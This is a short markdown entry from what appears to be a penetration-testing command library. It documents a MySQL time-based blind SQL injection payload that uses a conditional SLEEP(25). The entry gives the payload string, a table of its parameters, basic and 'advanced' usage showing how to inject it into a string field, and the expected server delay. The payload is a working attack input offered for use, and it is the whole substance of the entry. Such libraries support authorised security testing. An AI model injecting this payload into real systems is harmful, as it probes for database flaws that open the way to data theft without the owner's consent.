---
id: cmd-sql-25s
data: 'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
tags:
  - sqli
  - payload
  - sleep
type: command
output: Server delay of 25 seconds if executed
executor: sql
platforms:
  - MySQL
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.334Z'
verified: false
validated: true
submitted: true
---
# sql-payload-25s-sleep

## Command

```sql
XOR(if(now()=sysdate(),sleep(5*5),0))OR
```

## Description

MySQL payload for time-based blind SQLi using conditional SLEEP(25) to cause delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `now()=sysdate()` | Condition always true | Yes |
| `sleep(5*5)` | 25-second pause | Yes |

## Examples

### Basic Usage

```sql
XOR(if(now()=sysdate(),sleep(25),0))OR
```

### Advanced Usage

Inject into string: `'payload'XOR(if(...))OR`

## Expected Output

Execution causes 25-second server sleep.

## Related

- [[commands/sql-payload-no-sleep]]
- [[procedures/Confirm-SQLi-with-25-Second-Delay]]
